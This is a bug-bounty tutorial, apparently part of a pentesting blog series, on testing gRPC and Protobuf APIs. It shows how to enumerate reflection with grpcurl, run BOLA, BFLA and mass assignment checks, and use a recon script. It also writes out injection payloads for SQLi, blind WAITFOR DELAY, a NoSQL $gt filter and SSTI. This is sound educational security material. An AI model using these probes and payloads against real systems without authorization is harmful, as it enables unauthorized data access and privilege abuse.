# gRPC & Protobuf Security Testing: The API Protocol Most Hunters Skip

> **Series:** 30-Day API Pentesting | **Day 26** | Week 4: Advanced Attacks  
> **Difficulty:** Intermediate  
> **Topic:** gRPC & Protobuf Security — Recon, Reflection Abuse, BOLA/BFLA, Injection

---

## What is gRPC and Why Does It Matter for Bug Hunters?

Most APIs you've tested so far speak **REST** — they send and receive **JSON text** over standard HTTP/1.1. Your browser can read it, Burp can intercept it, curl can call it. Everything works out of the box.

**gRPC is different in three important ways:**

```
1. PROTOCOL:   HTTP/2 (not HTTP/1.1)
   → Multiplexed streams, binary framing, header compression

2. ENCODING:   Protocol Buffers (Protobuf) — binary, not JSON
   → Smaller payloads, faster parsing, but NOT human-readable

3. CONTRACTS:  Defined in .proto schema files
   → Every method, argument, and return type explicitly typed
```

This means:
```
REST:   curl https://target.com/api/users/1 → readable JSON response
gRPC:   curl https://target.com/UserService/GetUser → ERROR: binary garbage
```

### Why gRPC = Less Competition in Bug Bounty

Most bug hunters skip gRPC entirely because:
- Burp doesn't natively decode Protobuf
- curl doesn't speak gRPC
- WAFs often can't inspect gRPC frames
- Security tooling assumes REST/JSON

That's your edge. **The same vulnerabilities exist** — BOLA, BFLA, injection, mass assignment — but far fewer hunters look for them here.

---

## Part 1: Understanding Protobuf

Before you attack gRPC, you need to understand what Protobuf is.

### Protobuf Schema (.proto files)

```protobuf
// Example: user.proto
syntax = "proto3";

service UserService {
  rpc GetUser (GetUserRequest) returns (User);
  rpc ListUsers (ListUsersRequest) returns (ListUsersResponse);
  rpc DeleteUser (DeleteUserRequest) returns (Empty);
}

message GetUserRequest {
  int64 user_id = 1;    // field number 1, type int64
  string token  = 2;    // field number 2, type string
}

message User {
  int64  id       = 1;
  string email    = 2;
  string role     = 3;  // "user" or "admin"
  bool   is_admin = 4;
}
```

When the client calls `GetUser`, it serializes the `GetUserRequest` message into binary Protobuf and sends it over HTTP/2. The server deserializes it, processes it, and returns a serialized `User` message.

**Key insight for attackers:** The `.proto` file defines what fields *should* be there. Servers sometimes process extra fields that aren't in the schema — that's mass assignment.

---

## Part 2: Setting Up for gRPC Testing

### Install grpcurl (Your Main Tool)

```bash
# macOS
brew install grpcurl

# Linux — download binary
wget https://github.com/fullstorydev/grpcurl/releases/download/v1.8.9/grpcurl_1.8.9_linux_x86_64.tar.gz
tar -xzf grpcurl_*.tar.gz
sudo mv grpcurl /usr/local/bin/

# Verify
grpcurl --version

# Install grpc_cli (alternative from Google)
# pip install grpcio-tools
```

### Find gRPC Endpoints

```bash
# gRPC typically runs on different ports than web APIs
DEFAULT_GRPC_PORTS=(50051 50052 443 9090 8080)

# Test each port
for port in "${DEFAULT_GRPC_PORTS[@]}"; do
    grpcurl -plaintext target.com:$port list 2>&1 | grep -v "Failed\|Error" \
        && echo "gRPC on port $port!"
done

# For TLS (production):
grpcurl target.com:443 list 2>&1

# Check if grpc-web is exposed on regular HTTPS:
curl -X POST https://target.com/ServiceName/MethodName \
    -H "Content-Type: application/grpc" \
    -v 2>&1 | grep -i "grpc\|proto"
```

---

## Part 3: gRPC Reflection — Your Introspection Equivalent

gRPC has a built-in **reflection** service that works exactly like GraphQL introspection. When enabled, it lets any client ask the server "what services and methods do you have?"

It's meant for development. It's often left on in production.

### Running gRPC Reflection

```bash
TARGET="target.com:50051"

# Step 1: List all services
grpcurl -plaintext $TARGET list

# Output:
# UserService
# OrderService
# AdminService          ← interesting!
# grpc.reflection.v1alpha.ServerReflection

# Step 2: List methods for each service
grpcurl -plaintext $TARGET list UserService
# UserService.GetUser
# UserService.UpdateProfile
# UserService.DeleteAccount

grpcurl -plaintext $TARGET list AdminService
# AdminService.GetAllUsers    ← admin-only!
# AdminService.DeleteUser     ← dangerous!
# AdminService.ExportDatabase ← very dangerous!

# Step 3: Describe a method — get full argument/return schema
grpcurl -plaintext $TARGET describe AdminService.DeleteUser
# AdminService.DeleteUser is a method:
# rpc DeleteUser ( .DeleteUserRequest ) returns ( .Empty );

grpcurl -plaintext $TARGET describe .DeleteUserRequest
# message DeleteUserRequest {
#   int64 user_id = 1;
# }
```

### Reflection as a Finding

Even if you find no other bugs, **gRPC reflection enabled in production** is itself a **Low/Medium finding**:

```
Title: gRPC Server Reflection Enabled in Production

Finding: The gRPC server at target.com:50051 has the server reflection
service enabled, exposing the complete API schema including:
- All service names (UserService, AdminService, PaymentService)
- All method signatures and argument types
- Internal service structure not meant for public consumption

This allows an attacker to discover all API functionality without
any documentation, including internal admin services.

Remediation: Disable gRPC reflection in production builds.
```

---

## Part 4: Calling gRPC Methods and Finding Vulnerabilities

### Basic Method Calls

```bash
TARGET="target.com:50051"
AUTH="-H 'authorization: Bearer YOUR_TOKEN'"

# Call with JSON arguments (grpcurl converts to Protobuf internally)
grpcurl -plaintext \
    -d '{"user_id": 1}' \
    $TARGET UserService/GetUser

# Response (grpcurl converts Protobuf back to JSON for you):
# {
#   "id": "1",
#   "email": "admin@target.com",
#   "role": "admin"
# }

# With authentication
grpcurl -plaintext \
    -H 'authorization: Bearer YOUR_TOKEN' \
    -d '{"user_id": 1001}' \
    $TARGET UserService/GetUser
```

### BOLA via gRPC

```bash
TARGET="target.com:50051"
TOKEN_A="YOUR_ATTACKER_TOKEN"   # your account: user_id=1002
VICTIM_ID=1001

# Try to access victim's data with your token
grpcurl -plaintext \
    -H "authorization: Bearer $TOKEN_A" \
    -d "{\"user_id\": $VICTIM_ID}" \
    $TARGET UserService/GetUser

# If returns victim's data → BOLA via gRPC!

# Also test order/invoice endpoints
for object_id in 2001 2002 2003; do
    echo "Testing order_id=$object_id:"
    grpcurl -plaintext \
        -H "authorization: Bearer $TOKEN_A" \
        -d "{\"order_id\": $object_id}" \
        $TARGET OrderService/GetOrder
done
```

### BFLA via gRPC — Admin Methods with User Token

```bash
# You're a regular user. Test admin methods.
TOKEN_USER="YOUR_REGULAR_USER_TOKEN"

# Test admin-only methods discovered via reflection
ADMIN_METHODS=(
    "AdminService/GetAllUsers"
    "AdminService/DeleteUser"
    "AdminService/ExportDatabase"
    "AdminService/GetSystemConfig"
)

for method in "${ADMIN_METHODS[@]}"; do
    echo "Testing $method..."
    
    # Without auth
    grpcurl -plaintext \
        -d '{"user_id": 1}' \
        $TARGET $method 2>&1 | grep -v "^$"
    
    # With regular user token
    grpcurl -plaintext \
        -H "authorization: Bearer $TOKEN_USER" \
        -d '{"user_id": 1}' \
        $TARGET $method 2>&1 | grep -v "^$"
    
    echo "---"
done
```

### Injection via gRPC Arguments

```bash
# SQLi in string fields
grpcurl -plaintext \
    -H "authorization: Bearer TOKEN" \
    -d '{"name": "x'"'"' OR 1=1--"}' \
    $TARGET UserService/SearchUsers

# Test time-based blind SQLi
grpcurl -plaintext \
    -H "authorization: Bearer TOKEN" \
    -d '{"user_id": "1; WAITFOR DELAY '"'"'0:0:5'"'"'--"}' \
    $TARGET UserService/GetUser
# If response takes 5 seconds → blind SQLi!

# NoSQL injection
grpcurl -plaintext \
    -H "authorization: Bearer TOKEN" \
    -d '{"filter": {"$gt": ""}}' \
    $TARGET UserService/ListUsers

# SSTI in template fields
grpcurl -plaintext \
    -H "authorization: Bearer TOKEN" \
    -d '{"template": "{{7*7}}"}' \
    $TARGET ReportService/GenerateReport
# If response contains "49" → SSTI!
```

---

## Part 5: Protobuf Field Manipulation (Mass Assignment)

### How Protobuf Fields Work

Each field in a Protobuf message has a **field number** (1, 2, 3...) and a **type**. Clients and servers use field numbers, not names, in the binary encoding.

```
message GetUserRequest {
  int64 user_id = 1;   ← field number 1
  string token  = 2;   ← field number 2
}
```

If you send a field that's NOT in the official schema, some servers still process it if the field number happens to match a field in their internal/extended version of the message.

### Testing Mass Assignment

```bash
# Send extra fields not in the documented schema
grpcurl -plaintext \
    -H "authorization: Bearer TOKEN" \
    -d '{
        "user_id": 1,
        "role": "admin",
        "is_admin": true,
        "verified": true
    }' \
    $TARGET UserService/UpdateProfile

# Then check your profile
grpcurl -plaintext \
    -H "authorization: Bearer TOKEN" \
    -d '{"user_id": 1}' \
    $TARGET UserService/GetUser

# If role changed to "admin" → mass assignment via gRPC!
```

### Field Type Confusion

```bash
# Send string where int is expected
grpcurl -plaintext \
    -d '{"user_id": "x OR 1=1"}' \
    $TARGET UserService/GetUser

# Send negative values
grpcurl -plaintext \
    -d '{"quantity": -1, "product_id": 1}' \
    $TARGET OrderService/AddToCart

# Send extreme values
grpcurl -plaintext \
    -d '{"user_id": 9999999999}' \
    $TARGET UserService/GetUser
```

---

## Part 6: Making gRPC Work with Burp Suite

Burp Suite doesn't understand gRPC natively, but there are ways to make it work.

### Option 1: Burp gRPC Extension

```
1. Burp → Extensions → BApp Store → search "gRPC"
2. Install the gRPC/Protobuf decoder extension
3. Now Burp shows decoded JSON instead of binary in gRPC requests
4. You can modify and replay like normal HTTP requests
```

### Option 2: grpc-gateway (REST Wrapper)

Many gRPC services also expose a **REST gateway** — a transparent HTTP/JSON wrapper around the gRPC service. If the target has one, you can test the entire gRPC API using normal REST tools.

```bash
# Look for REST gateway endpoints
curl https://target.com/v1/users/1        # might call UserService/GetUser
curl https://target.com/api/users/1      # same
curl https://target.com/grpc-gateway/... # explicit gateway

# If found → test everything with Burp normally!
# The gateway converts your JSON to Protobuf and calls gRPC internally
```

### Option 3: grpcui — Web UI for gRPC

```bash
# Install grpcui
go install github.com/fullstorydev/grpcui/cmd/grpcui@latest

# Launch a local web UI for any gRPC service
grpcui -plaintext target.com:50051

# Opens browser at http://localhost:PORT
# → Select service → Select method → Fill form → Send
# → Configure Burp as upstream proxy to capture requests
```

---

## Automation Script — Full gRPC Recon

```bash
#!/bin/bash
TARGET="${1:-target.com:50051}"
TOKEN="${2:-YOUR_TOKEN}"
TLS="${3:--plaintext}"  # set to "" for TLS

echo "=== gRPC Security Assessment: $TARGET ==="

echo ""
echo "[1] Running reflection — listing all services..."
SERVICES=$(grpcurl $TLS $TARGET list 2>&1)
echo "$SERVICES"

echo ""
echo "[2] Describing all services and methods..."
while IFS= read -r service; do
    [[ "$service" == *"reflection"* ]] && continue
    echo "Service: $service"
    grpcurl $TLS $TARGET list "$service" 2>/dev/null | while read method; do
        echo "  Method: $method"
        grpcurl $TLS $TARGET describe "$method" 2>/dev/null | head -5
    done
done <<< "$SERVICES"

echo ""
echo "[3] Testing BFLA on admin-looking methods..."
echo "$SERVICES" | grep -i "admin\|internal\|system\|debug" | while read svc; do
    echo "Admin service found: $svc"
    grpcurl $TLS \
        -H "authorization: Bearer $TOKEN" \
        $TARGET "$svc" 2>&1 | head -5
done

echo ""
echo "[4] Testing reflection as a finding..."
if echo "$SERVICES" | grep -q "ServerReflection"; then
    echo "FINDING: Server reflection is ENABLED in production"
    echo "Severity: Low-Medium"
fi
```

---

## Checklist

```
☐  Find gRPC port — try 50051, 50052, 443, 9090, 8080
☐  Run reflection — grpcurl list → AdminService, internal services exposed?
☐  Describe all methods — full schema including argument names and types
☐  Call each method — test with your user token
☐  Test BOLA — change user_id/order_id arguments to other users' IDs
☐  Test BFLA — call AdminService methods with regular user token
☐  Inject in string fields — SQLi/SSTI/NoSQLi via grpcurl -d arguments
☐  Try mass assignment — add role/is_admin fields not in documented schema
☐  Check for grpc-gateway — REST wrapper that's easier to test with Burp
☐  Install grpcui — visual gRPC testing, route through Burp proxy
```

---

*Written by @anand87794*  
*30-Day API Pentesting Series — Day 26 of 30*
